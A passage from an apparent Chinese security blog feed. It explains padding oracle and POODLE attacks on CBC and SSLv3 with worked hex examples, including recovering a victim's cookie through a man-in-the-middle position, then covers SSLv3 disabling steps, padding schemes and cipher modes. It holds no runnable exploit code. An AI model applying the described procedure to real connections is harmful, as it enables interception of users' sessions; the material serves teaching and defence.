HTTP/1.1\r”，那么按ASCII的十六进制就可以表示为：</p><ul><li>第一组明文：“0x47、0x45、0x54、0x20、0x2F、0x61、0x20、0x48”</li><li>第二组明文：“0x54、0x54、0x50、0x2F、0x31、0x2E、0x31、0x0D”</li></ul><p>假设后面还有字符不能构成8字节的一组，那么需要进行填充，例如（前面字符没有用十六进制表示）：</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950619500.png" alt="1598950619500"></p><p>当然，一般不会有全填充的组。</p><p>（2）随机生成一个初始化向量IV，与第一个明文分组进行异或运算得到中间值（Intermediary Value）。</p><p>例如这里随机生成的IV为“0x01、0x02、0x03、0x04、0x05、0x06、0x07、0x08”，与第一个分组“0x47、0x45、0x54、0x20、0x2F、0x61、0x20、0x48”进行异或后得到“0x46、0x47、0x57、0x24、0x2A、0x67、0x27、0x40”。</p><p>（3）将异或结果进行加密，得到第一个明文分组的密文。</p><p>一般会使用密钥（key）加密，这里简单假设密钥加密效果等同于加密函数y = f(x) = x + 1，那么可以得到第一组密文“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”。</p><p>（4）从第二个明文分组开始，将上一组密文当作IV，进行异或运算，再进行加密，得到该组密文。</p><p>例如这里由第一组密文“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”与第二组明文“0x54、0x54、0x50、0x2F、0x31、0x2E、0x31、0x0D”进行异或，得到“0x13、0x1C、0x08、0x0A、0x1A、0x46、0x19、0x4C”，再进行相同加密，得到“0x14、0x1D、0x09、0x0B、0x1B、0x47、0x1A、0x4D”，这就是第二组密文。</p><h2 id="2-2-CBC密码块链接模式——解密"><a href="#2-2-CBC密码块链接模式——解密" class="headerlink" title="2.2 CBC密码块链接模式——解密"></a><strong>2.2 CBC密码块链接模式——解密</strong></h2><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950639436.png" alt="1598950639436"></p><p>加密的IV是随机生成的，而解密则必须使用这个IV。</p><p>（1）对密文进行分组，每组长度相同（一般为8字节或16字节）。</p><p>例如这里将密文分为了两组：</p><ul><li>第一组密文：“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”</li><li>第二组密文：“0x14、0x1D、0x09、0x0B、0x1B、0x47、0x1A、0x4D”</li></ul><p>（2）对密文进行解密，得到中间值。</p><p>一般使用密钥，同样的这里假设密钥效果等同于函数x = f(y) = y - 1</p><ul><li>第一组中间值：“0x46、0x47、0x57、0x24、0x2A、0x67、0x27、0x40”</li><li>第二组中间值：“0x13、0x1C、0x08、0x0A、0x1A、0x46、0x19、0x4C”</li></ul><p>（3）使用初始化向量IV，与第一个分组进行异或运算得到第一组明文。</p><p>这是利用异或的性质：a⊕b=c，a⊕c=b，b⊕c=a，所以无论如何异或都能得到唯一的第三个数。</p><p>例如这里IV为“0x01、0x02、0x03、0x04、0x05、0x06、0x07、0x08”，第一个数0x01与第一组第一个中间值0x46异或结果为0x47，就是明文“G”的ASCII十六进制表示，于是得到第一组明文“0x47、0x45、0x54、0x20、0x2F、0x61、0x20、0x48”</p><p>（4）从第二组开始，依次将前一组密文和该组中间值异或，得到该组明文。</p><p>例如第一组密文“0x47、0x48、0x58、0x25、0x2B、0x68、0x28、0x41”和第二组中间值“0x13、0x1C、0x08、0x0A、0x1A、0x46、0x19、0x4C”异或得到第二组明文“0x54、0x54、0x50、0x2F、0x31、0x2E、0x31、0x0D”。</p><p>值得注意的是，<strong>解密可以并行计算，因为密文都是已经获取好的</strong>；加密则不行，因为前一组密文必须要计算出来。</p><h2 id="2-3-Padding-Oracle-攻击"><a href="#2-3-Padding-Oracle-攻击" class="headerlink" title="2.3 Padding Oracle 攻击"></a><strong>2.3 Padding Oracle 攻击</strong></h2><h4 id="2-3-1-攻击原理"><a href="#2-3-1-攻击原理" class="headerlink" title="2.3.1 攻击原理"></a>2.3.1 攻击原理</h4><p><img src="/2020/09/01/htps-attack-paddingoracle/1599017277323.png" alt="1599017277323"></p><p><strong>攻击最终原理：</strong></p><p><strong>目标：</strong>已知IV，密文。求中间值。</p><p><strong>方法：</strong></p><p>通过逐字节伪造IV使得：<br>$$<br>伪造IV+中间值=0x01(明文)<br>$$<br>（因为服务器端会进行padding校验，回显成功与否，这里用的padding是pkcs#5）</p><p>然后利用：<br>$$<br>0x01(明文)+真实IV=中间值<br>$$<br>即可求得中间值，从而通过下列等式求得明文。<br>$$<br>真实IV+中间值=明文<br>$$</p><h4 id="2-3-2-攻击过程"><a href="#2-3-2-攻击过程" class="headerlink" title="2.3.2 攻击过程"></a>2.3.2 攻击过程</h4><hr><p>首先请注意，始终在字符串的末尾附加至少一个填充字节，因此将使用0x01填充7字节的值（如AVOCADO），而将8字节的值（如PLANTAIN）具有向其中添加了完整的填充块。填充字节的值还指示字节数，因此逻辑上最后一个密文块末尾的逻辑最终值必须是：</p><ul><li>单个0x01字节（0x01）</li><li>两个0x02字节（0x02、0x02）</li><li>三个0x03字节（0x03、0x03、0x03）</li><li>四个0x04字节（0x04、0x04、0x04、0x04）</li><li>…等等</li></ul><p><strong>如果最终的解密块未以这些有效字节序列之一结尾，则大多数密码提供程序将抛出无效的填充异常。引发此异常的事实对于攻击者（我们）而言至关重要，因为它是填充预言攻击的基础</strong>。</p><p>现在构造一个场景：假设密文仍然是上述字段“GET /a HTTP/1.1\r”，且用户连接到的是公共WIFI，攻击者可以通过抓包获取CBC密文以及初始化向量IV（当然要把IV明文传给服务器否则服务器无法解密第一个分组）。</p><p>我们现在希望通过密文和IV获取明文，由于“IV⊕中间值=明文”，问题转变为如何求IV对应的中间值。</p><p>我们知道，对大多数Web服务器而言：</p><ul><li><p>收到有效的密文（正确填充并包含有效数据的密文）后，应用程序将正常响应（200 OK）</p></li><li><p>收到无效的密文（解密后不会以有效填充结尾）时，应用程序将引发加密异常（500 Internal Server Error）</p></li><li><p><em>收到有效的密文（正确填充的密文）但解密为无效值时，应用程序将显示自定义错误消息（200 OK）</em></p><p>上面描述的场景是经典的Padding Oracle，因为我们可以使用应用程序的行为轻松确定提供的加密值是否正确填充。术语oracle是指可以用来确定测试通过还是失败的机制。</p><p>IV出现在解密的最后一步，而且是可以构造的，那么攻击者可以通过构造特殊的IV，直到符合“填充”规则通过解密流程（虽然不一定能通过数据合法性校验），具体而言：</p></li></ul><p>（1）构造“0x00、0x00、0x00、0x00、0x00、0x00、0x00、0x00”的特殊IV发送给服务端，不断尝试递增最后一位并发送给服务端，直到服务端解密成功。</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950652145.png" alt="1598950652145"></p><p>此时必然产生了1位填充（因为我们已经知道IV是0x01、0x02、0x03、0x04、0x05、0x06、0x07、0x08），最多尝试次数为256次。（<strong>这里最后一位必须为01才可以通过服务器的padding校验，因为采用的是PKCS5标准填充</strong>）</p><p>（2）计算出末位中间值，其值等于伪造向量末位异或0x01：0x41⊕0x01=0x40</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950673196.png" alt="1598950673196"></p><p>（3）利用原始向量末位值异或中间值，得到明文0x48，即字符“H”：0x40⊕0x08=0x48</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950689577.png" alt="1598950689577"></p><p>（4）利用中间值计算出末位为0x02的伪造向量应有值：0x40⊕0x02=0x42</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598950705091.png" alt="1598950705091"></p><p>（5）通过改变倒数第二位，直到生成0x020x02的末位明文填充字符，符合2位填充规则，然后类似地推测倒数第二位的中间值：</p><p><img src="http://cdn.bewindoweb.com/uploadpic/9a93974acc1def3a2247974deb3a6392.jpeg" alt="img"></p><p>重复上述步骤，就能够得到完整的明文信息，这就是Padding Oracle 填充提示攻击。</p><h1 id="三、POODLE攻击原理"><a href="#三、POODLE攻击原理" class="headerlink" title="三、POODLE攻击原理"></a>三、POODLE攻击原理</h1><h2 id="3-1-SSLv3-0存在的问题"><a href="#3-1-SSLv3-0存在的问题" class="headerlink" title="3.1 SSLv3.0存在的问题"></a><strong>3.1 SSLv3.0存在的问题</strong></h2><p>SSLv3.0的记录层可以使用如下加密方式：</p><table><thead><tr><th align="left">加密类型</th><th align="left">加密方式</th></tr></thead><tbody><tr><td align="left">块加密 Block Cipher</td><td align="left">IDEA</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">RC2-40</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">DES-40</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">DES</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">3DES</td></tr><tr><td align="left">块加密 Block Cipher</td><td align="left">FORTEZZA</td></tr><tr><td align="left">流加密 Stream Cipher</td><td align="left">RC-40</td></tr><tr><td align="left">流加密 Stream Cipher</td><td align="left">RC4-128</td></tr></tbody></table><p>流加密这里不讨论，也是有安全问题，主要讨论CBC块加密。</p><p><img src="/2020/09/01/htps-attack-paddingoracle/1598952050289.png" alt="1598952050289"></p><p>SSL记录层加密的是原始数据+MAC（消息验证码）信息摘要+填充字节，MAC一般是Hash值，SSLv3.0中MAC通常为20字节。也就是说，SSL先对数据做完整性校验，再进行CBC加密。在CBC解密的一端（服务器），SSL没有规定padding填充块字节内容，只校验填充块最后一个字节，该字节为填充长度，然后去掉填充的字符，再进行MAC验证，最后获得明文数据。</p><ul><li>先校验完整性，再加密，使得对端收到数据后先解密，后校验完整性，解密是否成功为攻击提供了判断依据；</li><li>只验证填充块的最后一个字节，因此填充块可以填充任意字符，且最后字符固定使得攻击者可以利用类似Padding Oracle的攻击机制。</li></ul><p>我们可以利用类似前面Padding Oracle的思路，将要解密的字符放到最后一个块末尾，不断地调整前一个IV的值（可能是初始化向量，也可能是前一段的密文，并且无论是哪个攻击者都是知道的），直到成功通过解密，此时明文必定为0x07或0x15（16字节一块的话）（因为需要填充一整块），最多尝试256次（或512次），就能够通过服务器验证，从而推导出对应的中间值，然后利用该中间值和IV推导出明文。这期间不用担心修改IV导致MAC校验失败，因为那是CBC解密之后的事情。</p><h2 id="3-2-利用SSL漏洞进行POODLE攻击"><a href="#3-2-利用SSL漏洞进行POODLE攻击" class="headerlink" title="3.2 利用SSL漏洞进行POODLE攻击"></a><strong>3.2 利用SSL漏洞进行POODLE攻击</strong></h2><p>假设攻击者B代理了客户端A的HTTPS访问服务器C的请求，可以截获到SSL密文数据以及SSL握手阶段的IV，且可以通过A去发送HTTPS请求，此时如果A没有退出登录，都会自动携带上Cookie。这样，B可以控制A发送的HTTP请求中的请求路径Path和请求体Body，并通过调整Path和Body，让A发出的请求满足两个条件：</p><ul><li>填充字段恰好填充了一个块长度</li><li>Cookie的第一个未知字符刚好出现在前面某个块的末尾</li></ul><p>例如，加密采用3DES，8字节一个块，且SSL上层为HTTP协议，发送的明文为：</p><pre class="line-numbers language-html"><code class="language-html">GET / HTTP/1.1\r\nCookie: abcdefgh \r\n\r\nXXXX MAC数据 XXXXXX7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="http://cdn.bewindoweb.com/uploadpic/4343d6e74ca6d402f60be08d3af7e425.jpeg" alt="img"></p><p>MAC数据可能并不是刚好8字节，不过无所谓。攻击者并不知道明文，但知道Cookie密文的位置，知道此时想要解密的cookie的最后一个字符在第4个块末尾。然后攻击者将整个块的密文复制到最后一个填充块密文上：</p><p><img src="http://cdn.bewindoweb.com/uploadpic/865b1480ac514fd22f27de5b08825418.jpeg" alt="img"></p><p>然后不断调整前一块（MAC数据）对应密文位置的值，直到通过解密校验，根据SSL的漏洞，此时最后一块最后一个值必然为0x07：</p><p><img src="http://cdn.bewindoweb.com/uploadpic/be0160296022f639c6aa6c25b3917167.jpeg" alt="img"></p><p>这里例子举得不好，0x07密文也是0x07，后面用0x07明、0x07密来区分，此时我们假设未知加密函数为f(x)，其逆为g(y)，那么根据CBC解密流程，有：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token number">0x07</span>明 <span class="token operator">=</span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token number">0x07</span>密<span class="token punctuation">)</span> ⊕  <span class="token number">0x01</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token function">g</span><span class="token punctuation">(</span><span class="token number">0x07</span>密<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x06</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>现在要求：（此时要注意不是拿0x6E ⊕ g(0x07密）,因为如果解密第四块，应该是第三块 最后一字符⊕g(0x07密））</p><pre class="line-numbers language-c"><code class="language-c">x <span class="token operator">=</span> <span class="token number">0x6E</span> ⊕ <span class="token function">g</span><span class="token punctuation">(</span><span class="token number">0x07</span>密）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因此x = 0x68，即字符”h”，得到解密明文”h”。</p><p>同理，通过控制请求路径，例如GET /a、GET /aa，不断地把已经解密的Cookie字符挤出，把未知字符留在该块末尾，然后循环进行前述操作，即可得到完整的Cookie字段。</p><h2 id="3-3-Padding验证和MAC验证返回结果不同的情况"><a href="#3-3-Padding验证和MAC验证返回结果不同的情况" class="headerlink" title="3.3 Padding验证和MAC验证返回结果不同的情况"></a><strong>3.3 Padding验证和MAC验证返回结果不同的情况</strong></h2><p>前面的操作都是建立在Padding验证和MAC验证返回结果不同的基础之上，如果返回结果相同，那么MAC会校验不过导致失去判断Padding验证成功的依据。此时攻击者需要利用响应时间的差异来进行判断。如果响应时间仍然相同，那么这种攻击就无效了。</p><h2 id="3-4-POODLE中“降级”的体现"><a href="#3-4-POODLE中“降级”的体现" class="headerlink" title="3**.4 POODLE中“降级”的体现**"></a>3**.4 POODLE中“降级”的体现**</h2><p>POODLE只在SSLv3.0以下版本才容易攻击成功，TLS会检查填充字符，所以TLS构造的padding通过服务器验证概率极低，TLSv1.3以后则完全避免了该漏洞。2014年，TLS已经得到广泛应用，但不乏少数服务器、客户端（比如IE6）和中间网络设备仍然采用SSL协议。因此为了平滑过渡增加用户体验，TLS1.2、TLS1.1、TLS1.0协议实现都会向后兼容SSLv3.0协议，最终协商通信协议为服务端和客户端支持的最高版本协议。如果记录协议中采用的是RC4流加密或者CBC模式的块加密，那么攻击者就可以进行POODLE攻击。</p><h1 id="4-解决方法"><a href="#4-解决方法" class="headerlink" title="4 解决方法"></a>4 解决方法</h1><p>禁用SSL 3.0协议(ssl version ssl3.0 disable)。</p><h2 id="4-1-服务端禁用方法"><a href="#4-1-服务端禁用方法" class="headerlink" title="4.1 服务端禁用方法"></a>4.1 服务端禁用方法</h2><p><strong>（1）Apache 2.x:</strong><br>在mod_ssl配置文件中使用如下命令禁用SSLv2和SSLv3：<br>SSLProtocol All -SSLv2 -SSLv3<br>重启Apache</p><p><strong>（2）Nginx:</strong><br>在配置文件中使用：<br>ssl_protocols TLSv1 TLSv1.1 TLSv1.2;<br>重启Nginx</p><p><strong>（3）lighttpd：</strong><br>确认lighttpd为1.4.29及以上版本<br>在配置文件中使用<br>ssl.use-sslv3 = “disable”<br>重启lighttpd</p><p><strong>（4）tomcat参考:</strong></p><pre><code>https://tomcat.apache.org/tomcat-6.0-doc/ssl-howto.html</code></pre><p><a href="https://tomcat.apache.org/tomcat-7.0-doc/ssl-howto.html">https://tomcat.apache.org/tomcat-7.0-doc/ssl-howto.html</a></p><p><strong>（5）IIS:</strong><br>查找如下注册表项：<br>HKey_Local_MachineSystemCurrentControlSetControlSecurityProviders SCHANNELProtocols<br>该注册表项通常包含以下子项：</p><ul><li>PCT 1.0</li><li>SSL 2.0</li><li>SSL 3.0</li><li>TLS 1.0<br>每个注册表项都保留适用于该项的协议相关信息。可以在服务器上禁用这些协议中的任一种。为此，</li></ul><p>请在协议SSL 3.0的服务器子项中创建一个新的DWORD值。名称为Enabled,将DWORD值设置为“00 00 00 00”。 重启IIS服务</p><h2 id="4-2-浏览器禁用方法"><a href="#4-2-浏览器禁用方法" class="headerlink" title="4.2 浏览器禁用方法"></a>4.2 浏览器禁用方法</h2><p><strong>（1）IE:</strong><br>“工具” -&gt; “Internet 选项” -&gt; “高级” ，取消”使用 SSL 3.0”的复选框。<br><strong>（2）Chrome:</strong></p><p>复制一个平时打开 Chrome 浏览器的快捷方式，在新的快捷方式上右键点击，进入属性，<br>在”目标”后面的空格中字段的末尾输入以下命令 –ssl-version-min=tls1<br><strong>（3）FireFox:</strong></p><p>在地址栏输入”about:config”，然后将 security.tls.version.min 调至 1。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>1、<a href="https://www.jianshu.com/p/ad8bdd87e131">《Web狗要懂的Padding Oracle攻击》</a>：很详细</p><p>2、<a href="https://www.jianshu.com/p/1851f778e579">《Padding Oracle》</a></p><p>3、[《百度百科：Padding Oracle》](<a href="https://baike.baidu.com/item/Padding">https://baike.baidu.com/item/Padding</a> Oracle/3530091?fr=aladdin)</p><p>4、<a href="https://baike.baidu.com/item/ASCII/309296?fr=aladdin">《ASCII表》</a>和<a href="https://www.23bei.com/tool-531.html">在线异或计算器</a>：便于实验</p><p>5、<a href="https://www.cnblogs.com/xzjf/p/8251651.html">《HTTPS 协议降级攻击原理》</a>：对攻击原理理解透彻</p><p>6、<a href="http://www.vuln.cn/6135">《CVE-2014-3566 SSLv3 POODLE原理分析 – insight-labs》</a>：有些许理解错误，注意辨别</p><p>7、<a href="https://www.imperialviolet.org/2014/10/14/poodle.html">《POODLE attacks on SSLv3 (14 Oct 2014)》</a>：英文原文例子</p><p>8、<a href="https://blog.csdn.net/howeverpf/article/details/40350113">《漏洞分析—SSLv3降级加密协议Padding Oracle攻击（POODLE）技术分析》</a>：例子详细</p><p>9、<a href="http://www.bubuko.com/infodetail-413104.html">《SSLv3 POODLE 攻击分析》</a>：最正确的一篇分析</p><p>10、<a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">《This POODLE Bites: Exploiting The SSL 3.0 Fallback》</a>：Google研究报告原文</p><p>11  <a href="https://www.onebug.org/%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E5%BA%93/87280.html">https://www.onebug.org/%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E5%BA%93/87280.html</a> ：预防办法</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2020/09/01/htps-attack-paddingoracle/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>分组密码--填充模式</title>
      <link>https://m01ly.github.io/2020/08/31/blockcipher-padding/</link>
      <guid>https://m01ly.github.io/2020/08/31/blockcipher-padding/</guid>
      <pubDate>Mon, 31 Aug 2020 08:51:03 GMT</pubDate>
      
      <description>&lt;p&gt;转载自 &lt;a href=&quot;https://www.jianshu.com/p/16e1cbc0b7a9&quot;&gt;https://www.jianshu.com/p/16e1cbc0b7a9&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;填充模式不仅仅适用于对称密码，非对称密码也会用到，比如RSA&lt;/p&gt;
&lt;p&gt;分组密码中，需要将明文按指定大小进行分组，由于明文并非指定大小的整数倍，因此在明文的最后一个分组需要将其填充至加密算法所要求的分组大小后进行加密。&lt;/p&gt;
&lt;p&gt;在解密时，按照同样的填充模式将填充的数据去除。&lt;/p&gt;
&lt;p&gt;斜体表示 SunJCE 支持，非斜体为 BouncyCastle 支持&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载自 <a href="https://www.jianshu.com/p/16e1cbc0b7a9">https://www.jianshu.com/p/16e1cbc0b7a9</a> </p><p>填充模式不仅仅适用于对称密码，非对称密码也会用到，比如RSA</p><p>分组密码中，需要将明文按指定大小进行分组，由于明文并非指定大小的整数倍，因此在明文的最后一个分组需要将其填充至加密算法所要求的分组大小后进行加密。</p><p>在解密时，按照同样的填充模式将填充的数据去除。</p><p>斜体表示 SunJCE 支持，非斜体为 BouncyCastle 支持</p><a id="more"></a><h3 id="NOPADDING"><a href="#NOPADDING" class="headerlink" title="NOPADDING"></a><em>NOPADDING</em></h3><p>不填充，在此填充下原始数据必须是分组大小的整数倍，非整数倍时无法使用该模式</p><h3 id="PKCS5PADDING，PKCS7PADDING"><a href="#PKCS5PADDING，PKCS7PADDING" class="headerlink" title="PKCS5PADDING，PKCS7PADDING"></a><em>PKCS5PADDING</em>，PKCS7PADDING</h3><p>填充至符合块大小的整数倍，填充值为填充数量数</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 07 07 07 07 07 07 07</code></li></ul><p><code>PKCS5PADDING</code> 的块大小应为 8 个字节，而 <code>PKCS7PADDING</code> 的块大小可以在 1~255 的范围内。但 SunJCE 的 Provider 实现中 <code>PKCS5PADDING</code> 也按 <code>PKCS7PADDING</code> 来进行处理了。</p><h3 id="ISO10126PADDING"><a href="#ISO10126PADDING" class="headerlink" title="ISO10126PADDING"></a>ISO10126PADDING</h3><p>填充至符合块大小的整数倍，填充值最后一个字节为填充的数量数，其他字节随机处理</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 3F 7A B4 09 14 36 07</code></li></ul><h3 id="ISO7816-4PADDING"><a href="#ISO7816-4PADDING" class="headerlink" title="ISO7816-4PADDING"></a>ISO7816-4PADDING</h3><p>填充至符合块大小的整数倍，填充值第一个字节为 0x80，其他字节填 0</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 80 00 00 00 00 00 00</code></li></ul><h3 id="ZEROBYTEPADDING"><a href="#ZEROBYTEPADDING" class="headerlink" title="ZEROBYTEPADDING"></a>ZEROBYTEPADDING</h3><p>填充至符合块大小的整数倍，填充值为 0</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</code></li></ul><h3 id="X923PADDING"><a href="#X923PADDING" class="headerlink" title="X923PADDING"></a>X923PADDING</h3><p>填充至符合块大小的整数倍，填充值最后一个字节为填充的数量数，其他字节填 0</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07</code></li></ul><h3 id="TBCPADDING（Trailing-Bit-Compliment）"><a href="#TBCPADDING（Trailing-Bit-Compliment）" class="headerlink" title="TBCPADDING（Trailing-Bit-Compliment）"></a>TBCPADDING（Trailing-Bit-Compliment）</h3><p>填充至符合块大小的整数倍，原文最后一位为“1”时填充 0x00，最后一位为“0”时填充“0xFF”</p><ul><li>原始：<code>FF FF FF FF FF FF FF FF FF</code></li><li>填充：<code>FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00</code></li><li>原始：<code>FF FF FF FF FF FF FF FF F0</code></li><li>填充：<code>FF FF FF FF FF FF FF FF F0 FF FF FF FF FF FF FF</code></li></ul><h3 id="PKCS1PADDING"><a href="#PKCS1PADDING" class="headerlink" title="PKCS1PADDING"></a><em>PKCS1PADDING</em></h3><p>该填充模式是 RSA 加密中使用的，详见 <a href="https://tools.ietf.org/html/rfc2313">RFC 2313</a>。RSA 加密时，需要将原文填充至密钥大小，填充的格式为：</p><pre><code>00 + BT + PS + 00 + D</code></pre><ul><li><code>00</code> 为固定字节</li><li><code>BT</code> 为处理模式。公钥操作时为 <code>02</code>，私钥操作为 <code>00</code> 或 <code>01</code></li><li><code>PS</code> 为填充字节，填充数量为 <code>k - 3 - D</code>，<code>k</code> 表示密钥长度，<code>D</code> 表示原文长度。<code>PS</code> 的最小长度为 8 个字节。填充的值根据 <code>BT</code> 值不同而不同： <ul><li><code>BT = 00</code> 时，填充全 <code>00</code></li><li><code>BT = 01</code> 时，填充全 <code>FF</code></li><li><code>BT = 02</code> 时，随机填充，但不能为 <code>00</code></li></ul></li></ul>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</category>
      
      
      <comments>https://m01ly.github.io/2020/08/31/blockcipher-padding/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>分组密码--工作模式</title>
      <link>https://m01ly.github.io/2020/08/31/blockcipher-operation-mode/</link>
      <guid>https://m01ly.github.io/2020/08/31/blockcipher-operation-mode/</guid>
      <pubDate>Mon, 31 Aug 2020 08:50:11 GMT</pubDate>
      
      <description>&lt;p&gt;转载wiki&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>转载wiki</p><a id="more"></a><h2 id="1-前期知识"><a href="#1-前期知识" class="headerlink" title="1 前期知识"></a>1 前期知识</h2><p>分组密码算法</p><h2 id="2-工作模式"><a href="#2-工作模式" class="headerlink" title="2 工作模式"></a>2 工作模式</h2><p>我们知道分组密码属于对称密码算法，但是每次只能处理特定长度的一块数据的算法，每块都是一个分组，分组的比特数就称为分组长度。因此针对加密的内容超过分组密码的分组长度时，该如何安全加密呢？这时候就需要工作模式来解决这个问题， 分组密码工作模式描述了如何重复加密比较长的多个数据块，工作模式中会用到加密算法，加密算法只是工作模式中的一环节，这里要区分开。</p><p> 常见的分组加密算法有: DES、3DES、AES、IDEA 。</p><p><strong>常见分组密码算法分组长度和密钥长度如下表:</strong></p><table><thead><tr><th>密码算法</th><th>分组长度</th><th>密钥长度</th></tr></thead><tbody><tr><td>DES</td><td>64 bit/8 byte</td><td>64(56+8) bit/8 byte</td></tr><tr><td>3DES</td><td>64 bit/8 byte</td><td>64/64*2/64 * 3 bit</td></tr><tr><td>AES</td><td>128 bit/16 byte</td><td>128/192/256 bit</td></tr></tbody></table><p>经典的工作模式有以下5种。</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598927024511.png" alt="1598927024511"></p><p> <img src="https://img-blog.csdnimg.cn/20200412155237387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW9xaWFvbGl1c2h1aUND,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> </p><h3 id="2-1-电子密码本（ECB）"><a href="#2-1-电子密码本（ECB）" class="headerlink" title="2.1 电子密码本（ECB）"></a>2.1 电子密码本（ECB）</h3><p>最简单的加密模式即为<strong>电子密码本</strong>（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</p><p><a href="https://zh.wikipedia.org/wiki/File:Ecb_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c4/Ecb_encryption.png" alt="Ecb encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Ecb_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/6/66/Ecb_decryption.png" alt="Ecb decryption.png"></a></p><p>本方法的缺点在于同样的明文块会被加密成相同的密文块；因此，它不能很好的隐藏数据模式。在某些场合，这种方法不能提供严格的数据保密性，因此并不推荐用于密码协议中。下面的例子显示了ECB在密文中显示明文的模式的程度：该图像的一个位图版本（左图）通过ECB模式可能会被加密成中图，而非ECB模式通常会将其加密成右图。</p><table><thead><tr><th><a href="https://zh.wikipedia.org/wiki/File:Tux.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/5/56/Tux.jpg" alt="Tux.jpg"></a></th><th><a href="https://zh.wikipedia.org/wiki/File:Tux_ecb.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Tux_ecb.jpg" alt="Tux ecb.jpg"></a></th><th><a href="https://zh.wikipedia.org/wiki/File:Tux_secure.jpg"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a0/Tux_secure.jpg" alt="Tux secure.jpg"></a></th></tr></thead><tbody><tr><td>原图</td><td>使用ECB模式加密</td><td>提供了伪随机性的非ECB模式</td></tr></tbody></table><p>右图是使用CBC，CTR或任何其它的更安全的模式加密左图可能产生的结果——与随机噪声无异。注意右图看起来的随机性并不能表示图像已经被安全的加密；许多不安全的加密法也可能产生这种“随机的”输出。</p><p>ECB模式也会导致使用它的协议不能提供数据完整性保护，易受到重放攻击的影响，因此每个块是以完全相同的方式解密的。例如，“梦幻之星在线：蓝色脉冲”在线电子游戏使用ECB模式的Blowfish密码。在密钥交换系统被破解而产生更简单的破解方式前，作弊者重复通过发送加密的“杀死怪物”消息包以非法的快速增加经验值。</p><h3 id="2-2-密码块链接（CBC）"><a href="#2-2-密码块链接（CBC）" class="headerlink" title="2.2 密码块链接（CBC）"></a>2.2 密码块链接（CBC）</h3><p>1976年，IBM发明了<strong>密码分组链接</strong>（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p><p><a href="https://zh.wikipedia.org/wiki/File:Cbc_encryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png" alt="Cbc encryption.png"></a></p><p><a href="https://zh.wikipedia.org/wiki/File:Cbc_decryption.png"><img src="https://upload.wikimedia.org/wikipedia/commons/6/66/Cbc_decryption.png" alt="Cbc decryption.png"></a></p><p>若第一个块的下标为1，则CBC模式的加密过程为</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926624504.png" alt="1598926624504"></p><p>而其解密过程则为</p><p><img src="/2020/08/31/blockcipher-operation-mode/1598926632436.png" 